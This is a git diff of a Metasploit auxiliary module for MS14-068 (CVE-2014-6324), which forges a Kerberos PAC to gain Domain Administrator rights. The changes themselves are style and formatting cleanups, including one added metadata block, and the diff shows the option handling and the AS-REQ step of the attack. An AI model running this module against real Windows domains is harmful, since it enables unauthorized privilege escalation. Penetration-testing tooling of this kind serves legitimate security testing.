@@ -8,24 +8,24 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Kerberos::Client
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name' => 'MS14-068 Microsoft Kerberos Checksum Validation Vulnerability',
-      'Description' => %q{
-        This module exploits a vulnerability in the Microsoft Kerberos implementation. The problem
-        exists in the verification of the Privilege Attribute Certificate (PAC) from a Kerberos TGS
-        request, where a domain user may forge a PAC with arbitrary privileges, including
-        Domain Administrator. This module requests a TGT ticket with a forged PAC and exports it to
-        a MIT Kerberos Credential Cache file. It can be loaded on Windows systems with the Mimikatz
-        help. It has been tested successfully on Windows 2008.
-      },
-      'Author' =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'MS14-068 Microsoft Kerberos Checksum Validation Vulnerability',
+        'Description' => %q{
+          This module exploits a vulnerability in the Microsoft Kerberos implementation. The problem
+          exists in the verification of the Privilege Attribute Certificate (PAC) from a Kerberos TGS
+          request, where a domain user may forge a PAC with arbitrary privileges, including
+          Domain Administrator. This module requests a TGT ticket with a forged PAC and exports it to
+          a MIT Kerberos Credential Cache file. It can be loaded on Windows systems with the Mimikatz
+          help. It has been tested successfully on Windows 2008.
+        },
+        'Author' => [
           'Tom Maddock', # Vulnerability discovery
           'Sylvain Monne', # pykek framework and exploit
           'juan vazquez' # Metasploit module
         ],
-      'References' =>
-        [
+        'References' => [
           ['CVE', '2014-6324'],
           ['MSB', 'MS14-068'],
           ['OSVDB', '114751'],
@@ -34,9 +34,15 @@ class MetasploitModule < Msf::Auxiliary
           ['URL', 'http://web.archive.org/web/20180107213459/https://github.com/bidord/pykek'],
           ['URL', 'https://www.rapid7.com/blog/post/2014/12/25/12-days-of-haxmas-ms14-068-now-in-metasploit']
         ],
-      'License' => MSF_LICENSE,
-      'DisclosureDate' => '2014-11-18'
-    ))
+        'License' => MSF_LICENSE,
+        'DisclosureDate' => '2014-11-18',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS],
+          'Reliability' => []
+        }
+      )
+    )
 
     register_options(
       [
@@ -44,14 +50,15 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('PASSWORD', [ true, 'The Domain User password' ]),
         OptString.new('DOMAIN', [ true, 'The Domain (upper case) Ex: DEMO.LOCAL' ]),
         OptString.new('USER_SID', [ true, 'The Domain User SID, Ex: S-1-5-21-1755879683-3641577184-3486455962-1000'])
-      ])
+      ]
+    )
   end
 
   def run
-    print_status("Validating options...")
+    print_status('Validating options...')
 
     unless datastore['USER_SID'] =~ /^S-(\d+-){6}\d+$/
-      print_error("Invalid USER_SID. Ex: S-1-5-21-1755879683-3641577184-3486455962-1000")
+      print_error('Invalid USER_SID. Ex: S-1-5-21-1755879683-3641577184-3486455962-1000')
       return
     end
 
@@ -65,19 +72,18 @@ class MetasploitModule < Msf::Auxiliary
 
     checksum_type = Rex::Proto::Kerberos::Crypto::Checksum::RSA_MD5
     etype = Rex::Proto::Kerberos::Crypto::Encryption::RC4_HMAC
-    encryptor = Rex::Proto::Kerberos::Crypto::Encryption::from_etype(etype)
+    encryptor = Rex::Proto::Kerberos::Crypto::Encryption.from_etype(etype)
     password_digest = encryptor.string_to_key(datastore['PASSWORD'])
 
     pre_auth = []
     pre_auth << build_as_pa_time_stamp(key: password_digest, etype: etype)
     pre_auth << build_pa_pac_request
-    pre_auth
 
     print_status("#{peer} - Sending AS-REQ...")
     res = send_request_as(
-      client_name: "#{datastore['USERNAME']}",
+      client_name: datastore['USERNAME'].to_s,
       server_name: "krbtgt/#{domain}",
-      realm: "#{domain}",
+      realm: domain.to_s,
       key: password_digest,
       pa_data: pre_auth,
       etype: [etype]
@@ -145,7 +151,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def warn_error(res)
-    "#{res.error_code}"
+    res.error_code.to_s
   end
 end
-
